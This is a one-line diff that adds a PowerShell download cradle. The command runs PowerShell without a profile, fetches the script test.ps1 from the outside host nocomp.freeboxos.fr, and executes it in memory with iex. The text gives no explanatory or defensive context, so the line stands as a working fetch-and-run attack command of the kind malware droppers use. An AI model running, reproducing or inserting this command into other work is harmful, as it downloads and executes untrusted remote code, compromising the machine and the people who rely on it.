@@ -1,0 +1,1 @@
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://nocomp.freeboxos.fr/test.ps1')"
